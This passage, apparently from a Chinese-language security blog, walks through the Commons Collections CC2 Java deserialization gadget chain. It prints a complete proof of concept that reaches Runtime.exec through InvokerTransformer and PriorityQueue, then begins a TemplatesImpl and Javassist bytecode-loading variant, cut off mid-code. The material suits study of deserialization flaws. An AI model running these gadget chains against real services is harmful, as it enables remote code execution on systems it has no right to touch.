+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">cha</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="w">  </span><span class="n">queue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">TransformingComparator</span><span class="p">(</span><span class="n">cha</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">serilize</span><span class="p">(</span><span class="n">pri</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">deserilize</span><span class="p">(</span><span class="s">&#34;ser.bin&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serilize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">out</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.bin&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">deserilize</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">Filename</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="n">ClassNotFoundException</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">in</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">Filename</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="o">=</span><span class="n">in</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">obj</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div></div><p>这次成功弹计算机了，不过在反序列化的时候调试发现根本就没触发方法，看来是序列化的时候出问题了。后面看了师傅们的文章，发现是在add出的问题。</p>
+<h4 id="问题二解决add提前触发"><strong>问题二、解决add提前触发</strong></h4>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627201750.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627201750.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627201750.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627201750.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627201750.png"
+        title="QQ截图20240627201750" /></p>
+<p>看见add调用offer方法的时候，会调用到sifUp方法，而这个方法又会直接调用到<code>siftUpUsingComparator</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627201946.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627201946.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627201946.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627201946.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627201946.png"
+        title="QQ截图20240627201946" /></p>
+<p>导致执行<code>compare</code>提前弹出计算机。那么我们可以让<code>comparator = null</code>，让sifUp调用 <code>siftUpComparable</code> 方法，那里面没有<code>compare</code>方法。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627203934.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627203934.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627203934.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627203934.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627203934.png"
+        title="QQ截图20240627203934" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">queue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">(</span><span class="n">1</span><span class="p">);</span></span></span></code></pre></div></div><p>但待会还是得要 <code>comparator</code>，所以在 add 执行完后利用反射修改<code>comparator</code>为<code>Tcomparator</code>对象</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.util.PriorityQueue&#34;</span><span class="p">).</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;comparator&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">queue</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">TransformingComparator</span><span class="p">(</span><span class="n">cha</span><span class="p">));</span></span></span></code></pre></div></div><p>所以最终poc：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.Transformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.comparators.TransformingComparator</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.PriorityQueue</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CC2</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">cha</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">queue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.util.PriorityQueue&#34;</span><span class="p">).</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;comparator&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">queue</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">TransformingComparator</span><span class="p">(</span><span class="n">cha</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">serilize</span><span class="p">(</span><span class="n">queue</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">deserilize</span><span class="p">(</span><span class="s">&#34;ser.bin&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serilize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">out</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.bin&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">deserilize</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">Filename</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="n">ClassNotFoundException</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">in</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">Filename</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="o">=</span><span class="n">in</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">obj</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627204834.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627204834.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627204834.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627204834.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627204834.png"
+        title="QQ截图20240627204834" /></p>
+<h2 id="利用链2分析">利用链2分析</h2>
+<p>在ysoserial的cc2中引入了 <code>TemplatesImpl</code> 类来进行承载攻击payload，需要用到 javassist，什么是 javassist，</p>
+<p>参考：<a href="../../java%20%e5%86%85%e5%ad%98%e9%a9%ac/java%20Agent%20%e5%ad%a6%e4%b9%a0%e4%ba%8e%e5%86%85%e5%ad%98%e9%a9%ac.md" rel="">java Agent 学习于内存马</a>，这里面有部分有介绍到。</p>
+<p>看了师傅们的分析，这个利用链2无非就是把最后函数调用改为了利用<code>temlatesimpl</code>动态加载字节码来加载恶意类。</p>
+<p>直接看到最后compare函数：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627212222.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627212222.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627212222.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627212222.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627212222.png"
+        title="QQ截图20240627212222" /></p>
+<p>我们想要利用<code>temlatesimpl</code>动态加载字节码就需要调用<code>TemplatesImpl.newTransformer()</code>方法，所以这里<code>this.transformer</code>可以为<code>InvokerTransformer</code>，直接利用<code>InvokerTransformer</code>反射调用<code>TemplatesImpl.newTransformer()</code>（也可以结合cc3不用<code>InvokerTransformer</code>类，利用<code>InstantiateTransformer</code>类来实现调用）。</p>
+<p>所以这里obj1参数得为<code>TemplatgesImpl</code>对象。向上朔源obj1也就是我们传入的<code>queue[0]</code>，待会可以利用反射给其赋值。</p>
+<p>动态加载字节码不用多说了：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">tem</span><span class="w"> </span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Files</span><span class="p">.</span><span class="na">readAllBytes</span><span class="p">(</span><span class="n">Paths</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;D:/gaoren.class&#34;</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setValue</span><span class="p">(</span><span class="n">tem</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">});</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setValue</span><span class="p">(</span><span class="n">tem</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_tfactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="p">());</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setValue</span><span class="p">(</span><span class="n">tem</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;gaoren&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setValue</span><span class="p">(</span><span class="n">tem</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_class&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">  </span></span></span></code></pre></div></div><p>只不过这里的<code>byte[] code = Files.readAllBytes(Paths.get(&quot;D:/gaoren.class&quot;));  </code>要更换一下，因为上面说了这里引入了Javassit依赖，这个依赖可以直接生成Java生成的字节码（感觉不如直接的class文件好用）。</p>
+<p>利用Javassit依赖生成java的class字节码：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">AbstractTranslet</span><span class="o">=</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">classPool</span><span class="o">=</span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="c1">//返回默认的类池</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">classPool</span><span class="p">.</span><span class="na">appendClassPath</span><span class="p">(</span><span class="n">AbstractTranslet</span><span class="p">);</span><span class="c1">//添加AbstractTranslet的搜索路径</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">payload</span><span class="o">=</span><span class="n">classPool</span><span class="p">.</span><span class="na">makeClass</span><span class="p">(</span><span class="s">&#34;gaoren&#34;</span><span class="p">);</span><span class="c1">//创建一个新的public类</span><span class="w">
